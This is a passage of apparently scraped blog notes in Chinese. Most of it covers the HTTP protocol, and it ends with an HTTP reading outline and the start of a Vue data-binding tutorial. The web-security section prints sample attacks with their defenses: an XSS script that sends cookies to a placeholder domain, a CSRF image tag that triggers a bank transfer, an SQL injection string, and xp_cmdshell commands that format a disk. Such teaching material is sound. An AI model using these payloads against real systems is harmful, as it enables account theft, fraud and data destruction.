Web）的三种技术：HTML、HTTP、URL。 RFC（Request for Comments，征求修正意见书），互联网的设计文档。 1.2 URL URI（Uniform Resource Indentifier`，统一资源标识符） URL（Uniform Resource Locator，统一资源定位符） URN（Uniform Resource Name，统一资源名称），例如 urn:isbn:0-486-27557-4。 URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。 1.3 请求和响应报文1.3.1 请求报文 1.3.2. 响应报文 二、HTTP 方法 客户端发送的 请求报文 第一行为请求行，包含了方法字段。 2.1 GET 获取资源 当前网络请求中，绝大部分使用的是 GET 方法。 2.2 HEAD 获取报文首部 和 GET 方法一样，但是不返回报文实体主体部分。 主要用于确认 URL 的有效性以及资源更新的日期时间等。 2.3 POST 传输实体主体 POST 主要用来传输数据，而 GET 主要用来获取资源。 2.4 PUT 上传文件 由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。 123456PUT /new.html HTTP/1.1Host: example.comContent-type: text/htmlContent-length: 16&lt;p&gt;New File&lt;/p&gt; 2.5 PATCH 对资源进行部分修改 PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。 1234567PATCH /file.txt HTTP/1.1Host: www.example.comContent-Type: application/exampleIf-Match: \"e0023aa4e\"Content-Length: 100[description of changes] 2.6 DELETE 删除文件 与 PUT 功能相反，并且同样不带验证机制。 1DELETE /file.html HTTP/1.1 2.7 OPTIONS 查询支持的方法 查询指定的 URL 能够支持的方法。 会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。 2.8 CONNECT 要求用隧道协议连接代理 要求在与代理服务器通信时建立隧道，使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。 1CONNECT www.example.com:443 HTTP/1.1 2.9 TRACE 追踪路径 服务器会将通信路径返回给客户端。 发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。 通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪），因此更不会去使用它。 三、HTTP 状态码 服务器返回的 响应报文 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。 状态码 类别 原因短语 1XX Informational（信息性状态码） 接收的请求正在处理 2XX Success（成功状态码） 请求正常处理完毕 3XX Redirection（重定向状态码） 需要进行附加操作以完成请求 4XX Client Error（客户端错误状态码） 服务器无法处理请求 5XX Server Error（服务器错误状态码） 服务器处理请求出错 3.1 1XX 信息 100 Continue ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。 3.2 2XX 成功 200 OK 204 No Content ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。 206 Partial Content ：表示客户端进行了范围请求。响应报文包含由 Content-Range 指定范围的实体内容。 3.3 3XX 重定向 301 Moved Permanently ：永久性重定向 302 Found ：临时性重定向 303 See Other ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。 注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。 304 Not Modified ：如果请求报文首部包含一些条件，例如：If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。 307 Temporary Redirect ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。 3.4 4XX 客户端错误 400 Bad Request ：请求报文中存在语法错误。 401 Unauthorized ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。 403 Forbidden ：请求被拒绝，服务器端没有必要给出拒绝的详细理由。 404 Not Found 3.5 5XX 服务器错误 500 Internal Server Error ：服务器正在执行请求时发生错误。 503 Service Unavilable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。 四、HTTP 首部 有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段 各种首部字段及其含义如下（不需要全记，仅供查阅）： 4.1 通用首部字段 首部字段名 说明 Cache-Control 控制缓存的行为 Connection 控制不再转发给代理的首部字段、管理持久连接 Date 创建报文的日期时间 Pragma 报文指令 Trailer 报文末端的首部一览 Transfer-Encoding 指定报文主体的传输编码方式 Upgrade 升级为其他协议 Via 代理服务器的相关信息 Warning 错误通知 4.2 请求首部字段 首部字段名 说明 Accept 用户代理可处理的媒体类型 Accept-Charset 优先的字符集 Accept-Encoding 优先的内容编码 Accept-Language 优先的语言（自然语言） Authorization Web 认证信息 Expect 期待服务器的特定行为 From 用户的电子邮箱地址 Host 请求资源所在服务器 If-Match 比较实体标记（ETag） If-Modified-Since 比较资源的更新时间 If-None-Match 比较实体标记（与 If-Match 相反） If-Range 资源未更新时发送实体 Byte 的范围请求 If-Unmodified-Since 比较资源的更新时间（与 If-Modified-Since相反） Max-Forwards 最大传输逐跳数 Proxy-Authorization 代理服务器要求客户端的认证信息 Range 实体的字节范围请求 Referer 对请求中 URI 的原始获取方 TE 传输编码的优先级 User-Agent HTTP 客户端程序的信息 4.3 响应首部字段 首部字段名 说明 Accept-Ranges 是否接受字节范围请求 Age 推算资源创建经过时间 ETag 资源的匹配信息 Location 令客户端重定向至指定 URI Proxy-Authenticate 代理服务器对客户端的认证信息 Retry-After 对再次发起请求的时机要求 Server HTTP 服务器的安装信息 Vary 代理服务器缓存的管理信息 WWW-Authenticate 服务器对客户端的认证信息 4.4 实体首部字段 首部字段名 说明 Allow 资源可支持的 HTTP方法 Content-Encoding 实体主体适用的编码方式 Content-Language 实体主体的自然语言 Content-Length 实体主体的大小 Content-Location 替代对应资源的 URI Content-MD5 实体主体的报文摘要 Content-Range 实体主体的位置范围 Content-Type 实体主体的媒体类型 Expires 实体主体过期的日期时间 Last-Modified 资源的最后修改日期时间 五、具体应用5.1 Cookie HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。 Cookie 是服务器发送给客户端的数据，该数据会被保存在浏览器中，并且客户端的下一次请求报文会包含该数据。通过 Cookie 可以让服务器知道两个请求是否来自于同一个客户端，从而实现保持登录状态等功能。 5.1.1 创建过程 服务器发送的响应报文包含 Set-Cookie 字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中 123456HTTP/1.0 200 OKContent-type: text/htmlSet-Cookie: yummy_cookie=chocoSet-Cookie: tasty_cookie=strawberry[page content] 客户端之后发送请求时，会从浏览器中读出 Cookie 值，在请求报文中包含 Cookie 字段 123GET /sample_page.html HTTP/1.1Host: www.example.orgCookie: yummy_cookie=choco; tasty_cookie=strawberry 5.1.2 分类 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。 持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）之后就成为了持久性的 Cookie。 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 5.1.3 Set-Cookie 属性 说明 NAME=VALUE 赋予 Cookie 的名称和其值（必需项） expires=DATE Cookie 的有效期（若不明确指定则默认为浏览器关闭前为止） path=PATH 将服务器上的文件目录作为 Cookie 的适用对象（若不指定则默认为文档所在的文件目录） domain=域名 作为 Cookie 适用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名） Secure 仅在 HTTPs 安全通信时才会发送 Cookie HttpOnly 加以限制，使 Cookie 不能被 JavaScript 脚本访问 5.1.4 Session 和 Cookie 区别 Session 是服务器用来跟踪用户的一种手段，每个 Session 都有一个唯一标识：Session ID。当服务器创建了一个 Session 时，给客户端发送的响应报文包含了 Set-Cookie 字段，其中有一个名为 sid 的键值对，这个键值对就是 Session ID。客户端收到后就把 Cookie 保存在浏览器中，并且之后发送的请求报文都包含 Session ID。HTTP 就是通过 Session 和 Cookie 这两种方式一起合作来实现跟踪用户状态的，Session 用于服务器端，Cookie 用于客户端。 5.1.5 浏览器禁用 Cookie 的情况 会使用 URL 重写技术，在 URL 后面加上 sid=xxx 。 5.1.6 使用 Cookie 实现用户名和密码的自动填写 网站脚本会自动从保存在浏览器中的 Cookie 读取用户名和密码，从而实现自动填写。 但是如果 Set-Cookie 指定了 HttpOnly属性，就无法通过 Javascript脚本获取 Cookie信息，这是出于安全性考虑。 5.2 缓存5.2.1 优点 降低服务器的负担； 提高响应速度（缓存资源比服务器上的资源离客户端更近） 5.2.2 实现方法 让代理服务器进行缓存 让客户端浏览器进行缓存 5.2.3 Cache-Control 字段 HTTP 通过 Cache-Control 首部字段来控制缓存。 1Cache-Control: private, max-age=0, no-cache 5.2.4 no-cache 指令 该指令出现在请求报文的 Cache-Control 字段中，表示缓存服务器需要先向原服务器验证缓存资源是否过期 该指令出现在响应报文的 Cache-Control 字段中，表示缓存服务器在进行缓存之前需要先验证缓存资源的有效性 5.2.5 no-store 指令 该指令表示缓存服务器不能对请求或响应的任何一部分进行缓存。 no-cache 不表示不缓存，而是缓存之前需要先进行验证，no-store 才是不进行缓存。 5.2.6 max-age 指令 该指令出现在请求报文的 Cache-Control 字段中，如果缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。 该指令出现在响应报文的 Cache-Control 字段中，表示缓存资源在缓存服务器中保存的时间。 Expires 字段也可以用于告知缓存服务器该资源什么时候会过期。在 HTTP/1.1中，会优先处理 Cache-Control : max-age 指令；而在 HTTP/1.0 中，Cache-Control : max-age 指令会被忽略掉。 5.3 持久连接 当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源，如果每进行一次 HTTP 通信就要断开一次 TCP 连接，连接建立和断开的开销会很大。持久连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。 持久连接需要使用 Connection 首部字段进行管理。HTTP/1.1 开始 HTTP 默认是持久化连接的，如果要断开 TCP 连接，需要由客户端或者服务器端提出断开，使用 Connection : close；而在 HTTP/1.1 之前默认是非持久化连接的，如果要维持持续连接，需要使用 Connection : Keep-Alive。 5.4 管线化处理 HTTP/1.1 支持管线化处理，可以同时发送多个请求和响应，而不需要发送一个请求然后等待响应之后再发下一个请求。 5.5 编码 编码（Encoding）主要是为了对实体进行压缩。常用的编码有：gzip、compress、deflate、identity，其中 identity 表示不执行压缩的编码格式。 5.6 分块传输编码 Chunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。 5.7 多部分对象集合 一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。 例如，上传多个表单时可以使用如下方式： 123456789101112Content-Type: multipart/form-data; boundary=AaB03x--AaB03xContent-Disposition: form-data; name=\"submit-name\"Larry--AaB03xContent-Disposition: form-data; name=\"files\"; filename=\"file1.txt\"Content-Type: text/plain... contents of file1.txt ...--AaB03x-- 5.8 范围请求 如果网络出现中断，服务器只发送了一部分数据，范围请求使得客户端能够只请求未发送的那部分数据，从而避免服务器端重新发送所有数据。 在请求报文首部中添加 Range 字段指定请求的范围，请求成功的话服务器发送 206 Partial Content 状态。 123GET /z4d4kWk.jpg HTTP/1.1Host: i.imgur.comRange: bytes=0-1023 12345HTTP/1.1 206 Partial ContentContent-Range: bytes 0-1023/146515Content-Length: 1024...(binary content) 5.9 内容协商 通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。 涉及以下首部字段：Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Language。 5.10 虚拟主机 HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。 使用 Host 首部字段进行处理。 5.11 通信数据转发5.11.1 代理 代理服务器接受客户端的请求，并且转发给其它服务器。 使用代理的主要目的是：缓存、网络访问控制以及访问日志记录。 代理服务器分为正向代理和反向代理两种，用户察觉得到正向代理的存在，而反向代理一般位于内部网络中，用户察觉不到。 2. 网关 与代理服务器不同的是，网关服务器会将 HTTP - 转化为其它协议进行通信，从而请求其它非 HTTP服务器的服务。 3. 隧道 使用 SSL 等加密手段，为客户端和服务器之间建立一条安全的通信线路。隧道本身不去解析 HTTP 请求。 六、HTTPs HTTP 有以下安全性问题： 使用明文进行通信，内容可能会被窃听； 不验证通信方的身份，通信方的身份有可能遭遇伪装； 无法证明报文的完整性，报文有可能遭篡改。 HTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说 HTTPs 使用了隧道进行通信。 通过使用 SSL，HTTPs 具有了加密、认证和完整性保护。 6.1 加密6.1.1 对称密钥加密 对称密钥加密（Symmetric-Key Encryption），加密的加密和解密使用同一密钥。 优点：运算速度快； 缺点：密钥容易被获取。 6.1.2 公开密钥加密 公开密钥加密（Public-Key Encryption），也称为非对称密钥加密，使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。 优点：更为安全； 缺点：运算速度慢； 6.1.3 HTTPs 采用的加密方式 HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称密钥，之后使用对称密钥加密进行通信。（下图中的 Session Key就是对称密钥） 6.2 认证 通过使用 证书 来对通信方进行认证。 数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。 进行HTTPs 通信时，服务器会把证书发送给客户端，客户端取得其中的公开密钥之后，先进行验证，如果验证通过，就可以开始通信。 使用 OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。浏览器在访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。 6.3 完整性 SSL 提供报文摘要功能来验证完整性。 七、Web 攻击技术7.1 攻击模式7.1.1 主动攻击 直接攻击服务器，具有代表性的有 SQL 注入和 OS 命令注入。 7.1.2 被动攻击 设下圈套，让用户发送有攻击代码的 HTTP 请求，用户会泄露 Cookie 等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。 7.2 跨站脚本攻击7.2.1 概念 跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。 例如有一个论坛网站，攻击者可以在上面发表以下内容： 1&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt; 之后该内容可能会被渲染成以下形式： 1&lt;p&gt;&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;&lt;/p&gt; 另一个用户浏览了含有这个内容的页面将会跳往 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。 7.2.2 危害 伪造虚假的输入表单骗取个人信息 窃取用户的 Cookie 值 显示伪造的文章或者图片 7.2.3 防范手段过滤特殊字符 许多语言都提供了对 HTML 的过滤： PHP 的 htmlentities() 或是 htmlspecialchars()。 Python 的 cgi.escape()。 Java 的 xssprotect (Open Source Library)。 Node.js 的 node-validator。 指定 HTTP 的 Content-Type 通过这种方式，可以避免内容被当成 HTML 解析，比如 PHP 语言可以使用以下代码： 123&lt;?php header('Content-Type: text/javascript; charset=utf-8');?&gt; 7.3 跨站点请求伪造7.3.1 概念 跨站点请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。 XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。 假如一家银行用以执行转账操作的 URL 地址如下： 1http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。 那么，一个恶意攻击者可以在另一个网站上放置如下代码： 1&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。 如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。 这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。 透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。 7.3.2 防范手段检查 Referer 字段 HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。 这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。 添加校验 Token 由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 Token 的值为空或者错误，拒绝这个可疑请求。 7.4 SQL 注入攻击7.4.1 概念服务器上的数据库运行非法的 SQL 语句。 7.4.2 攻击原理例如一个网站登录验证的 SQL 查询代码为： 1strSQL = \"SELECT * FROM users WHERE (name = '\" + userName + \"') and (pw = '\"+ passWord +\"');\" 如果填入以下内容： 12userName = \"1' OR '1'='1\";passWord = \"1' OR '1'='1\"; 那么 SQL 查询字符串为： 1strSQL = \"SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');\" 此时无需验证通过就能执行以下查询： 1strSQL = \"SELECT * FROM users;\" 7.4.3 危害 数据表中的数据外泄，例如个人机密数据，账户数据，密码等。 数据结构被黑客探知，得以做进一步攻击（例如 SELECT * FROM sys.tables）。 数据库服务器被攻击，系统管理员账户被窜改（例如 ALTER LOGIN sa WITH PASSWORD=’xxxxxx’）。 获取系统较高权限后，有可能得以在网页加入恶意链接、恶意代码以及 XSS 等。 经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如 xp_cmdshell “net stop iisadmin” 可停止服务器的 IIS 服务）。 破坏硬盘数据，瘫痪全系统（例如 xp_cmdshell “FORMAT C:”）。 7.4.4 防范手段 在设计应用程序时，完全使用参数化查询（Parameterized Query）来设计数据访问功能。 在组合 SQL 字符串时，先针对所传入的参数作字符取代（将单引号字符取代为连续 2 个单引号字符）。 如果使用 PHP 开发网页程序的话，亦可打开 PHP 的魔术引号（Magic quote）功能（自动将所有的网页传入参数，将单引号字符取代为连续 2 个单引号字符）。 其他，使用其他更安全的方式连接 SQL 数据库。例如已修正过 SQL 注入问题的数据库连接组件，例如 ASP.NET 的 SqlDataSource 对象或是 LINQ to SQL。 使用 SQL 防注入系统。 7.5 拒绝服务攻击7.5.1 概念 拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。 分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。 维基百科：拒绝服务攻击 八、GET 和 POST 的区别8.1 参数 GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在内容实体中。 GET 的传参方式相比于 POST 安全性较差，因为 GET 传的参数在 URL 中是可见的，可能会泄露私密信息。并且 GET 只支持 ASCII 字符，如果参数为中文则可能会出现乱码，而 POST 支持标准字符集。 1GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1 123POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2 8.2 安全 安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。 GET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。 安全的方法除了 GET 之外还有：HEAD、OPTIONS。 不安全的方法除了 POST 之外还有 PUT、DELETE。 8.3 幂等性 幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。所有的安全方法也都是幂等的。 GET /pageX HTTP/1.1 是幂等的。连续调用多次，客户端接收到的结果都是一样的： 1234GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1 POST /add_row HTTP/1.1 不是幂等的。如果调用多次，就会增加多行记录： 123POST /add_row HTTP/1.1POST /add_row HTTP/1.1 -&gt; Adds a 2nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 3rd row DELETE /idX/delete HTTP/1.1 是幂等的，即便是不同请求之间接收到的状态码不一样： 123DELETE /idX/delete HTTP/1.1 -&gt; Returns 200 if idX existsDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 as it just got deletedDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 8.4 可缓存 如果要对响应进行缓存，需要满足以下条件： 请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。 响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300,301, 404, 405, 410, 414, and 501。 响应报文的 Cache-Control 首部字段没有指定不进行缓存。 8.5 XMLHttpRequest 为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest： XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。 在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。 九、各版本比较9.1 HTTP/1.0 与 HTTP/1.1 的区别 HTTP/1.1 默认是持久连接 HTTP/1.1 支持管线化处理 HTTP/1.1 支持虚拟主机 HTTP/1.1 新增状态码 100 HTTP/1.1 只是分块传输编码 HTTP/1.1 新增缓存处理指令 max-age 9.2 HTTP/1.1 与 HTTP/2.0 的区别9.2.1 多路复用 HTTP/2.0 使用多路复用技术，使用同一个 TCP 连接来处理多个请求 9.2.2 首部压缩 HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求通讯双方各自缓存一份首部字段表，从而避免了重复传输。 9.2.3 服务端推送 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 index.html 页面，服务端就把 index.js 一起发给客户端 9.2.4 二进制格式 HTTP/1.1 的解析是基于文本的，而 HTTP/2.0 采用二进制格式","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://ru23.com/tags/HTTP/"}]},{"title":"HTTP协议系列（二）","slug":"2018-02-http-2","date":"2018-02-26T15:20:43.000Z","updated":"2018-10-24T03:46:02.346Z","comments":true,"path":"note/7d45851a.html","link":"","permalink":"https://ru23.com/note/7d45851a.html","excerpt":"","text":"图解HTTP一书 一、了解web及网络基础 对于与HTTP相关的协议如TCP,IP,DNS,ARP等，它们之间协作关系如下： 二、简单的HTTP协议 2.1 请求与响应 HTTP协议通过客户端(request)，服务器端(response)实现网络通信 请求报文： 响应报文： 2.2 HTTP非持久连接和持久连接 HTTP既可以使用非持久连接（nonpersistent connection），也可以使用持久连接（persistent connection）。HTTP/1.0使用非持久连接，HTTP/1.1默认使用持久连接。 HTTP持久连接是使用同一个TCP连接来发送和接收多个HTTP请求/应答，而不是为每一个新的请求/应答打开新的连接的方法 2.3 HTTP管线化 HTTP管线化将多个HTTP请求整批提交，而在发送过程中不需先等待服务端的回应。 三、HTTP报文内HTTP信息 3.1 请求报文 下面是一个实际请求： 3.2 响应报文 以下是一个实际的HTTP响应报文： 四、返回结果的HTTP状态码 五、与HTTP协作的Web服务器 六、HTTP首部 6.1 通用首部字段 6.2 请求首部字段 6.3 响应首部字段 6.4 实体首部字段 6.5 为 Cookie 服务的首部字段 七、确保Web安全的Https 八、确认访问用户身份的认证 九、基于HTTP的功能追加协议","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://ru23.com/tags/HTTP/"}]},{"title":"实现数据的双向绑定mvvm-剖析Vue的原理","slug":"2018-03-vue-mvvm","date":"2018-02-25T09:12:32.000Z","updated":"2018-10-24T03:46:02.445Z","comments":true,"path":"note/bfaf4cce.html","link":"","permalink":"https://ru23.com/note/bfaf4cce.html","excerpt":"","text":"完成的效果 1234567891011121314151617181920212223&lt;div id=\"mvvm-app\"&gt; &lt;input type=\"text\" v-model=\"word\"&gt; &lt;p&gt;&#123;&#123;word&#125;&#125;&lt;/p&gt; &lt;button v-on:click=\"sayHi\"&gt;change model&lt;/button&gt;&lt;/div&gt;&lt;script src=\"observer.js\"&gt;&lt;/script&gt;&lt;script src=\"watcher.js\"&gt;&lt;/script&gt;&lt;script src=\"compile.js\"&gt;&lt;/script&gt;&lt;script src=\"mvvm.js\"&gt;&lt;/script&gt;&lt;script&gt;var vm = new MVVM(&#123; el: '#mvvm-app', data: &#123; word: 'Hello World!' &#125;, methods: &#123; sayHi: function() &#123; this.word = 'Hi, everybody!'; &#125; &#125; &#125;);&lt;/script&gt; 一、几种实现双向绑定的做法 目前几种主流的mvc(vm)框架都实现了单向数据绑定，而我所理解的双向数据绑定无非就是在单向绑定的基础上给可输入元素（input、textare等）添加了change(input)事件，来动态修改model和 view，并没有多高深。所以无需太过介怀是实现的单向或双向绑定。 发布者-订阅者模式（backbone.js） 脏值检查（angular.js） 数据劫持（vue.js） 1.1 发布者-订阅者模式 一般通过sub, pub的方式实现数据和视图的绑定监听，更新数据方式通常做法是 vm.set(&#39;property&#39;, value)，这里有篇文章讲的比较详细 这种方式现在毕竟太low了，我们更希望通过 vm.property = value这种方式更新数据，同时自动更新视图，于是有了下面两种方式 1.2 脏值检查 angular.js 是通过脏值检测的方式比对数据是否有变更，来决定是否更新视图，最简单的方式就是通过 setInterval() 定时轮询检测数据变动，当然Google不会这么low，angular只有在指定的事件触发时进入脏值检测，大致如下： DOM事件，譬如用户输入文本，点击按钮等。( ng-click ) XHR响应事件 ( $http ) 浏览器Location变更事件 ( $location ) Timer事件( $timeout , $interval ) 执行 $digest() 或 $apply() 1.3 数据劫持 vue.js则是采用数据劫持结合发布者-订阅者模式的方式，通过Object.defineProperty()来劫持各个属性的setter，getter，在数据变动时发布消息给订阅者，触发相应的监听回调。 二、实现思路 已经了解到vue是通过数据劫持的方式来做数据绑定的，其中最核心的方法便是通过Object.defineProperty()来实现对属性的劫持，达到监听数据变动的目的，无疑这个方法是本文中最重要、最基础的内容之一，如果不熟悉defineProperty，猛戳这里 要实现mvvm的双向绑定，就必须要实现以下几点 实现一个数据监听器Observer，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者 实现一个指令解析器Compile，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数 实现一个Watcher，作为连接Observer和Compile的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图 mvvm入口函数，整合以上三者 上述流程如图所示： 2.1 实现Observer 我们知道可以利用Obeject.defineProperty()来监听属性变动 那么将需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上setter和getter 这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化。相关代码可以是这样 12345678910111213141516171819202122232425262728var data = &#123;name: 'kindeng'&#125;;observe(data);data.name = 'dmq'; // 哈哈哈，监听到值变化了 kindeng --&gt; dmqfunction observe(data) &#123; if (!data || typeof data !== 'object') &#123; return; &#125; // 取出所有属性遍历 Object.keys(data).forEach(function(key) &#123; defineReactive(data, key, data[key]); &#125;);&#125;;function defineReactive(data, key, val) &#123; observe(val); // 监听子属性 Object.defineProperty(data, key, &#123; enumerable: true, // 可枚举 configurable: false, // 不能再define get: function() &#123; return val; &#125;, set: function(newVal) &#123; console.log('哈哈哈，监听到值变化了 ', val, ' --&gt; ', newVal); val = newVal; &#125; &#125;);&#125; 完整代码 https://github.com/poetries/mvvm/blob/master/observer.js 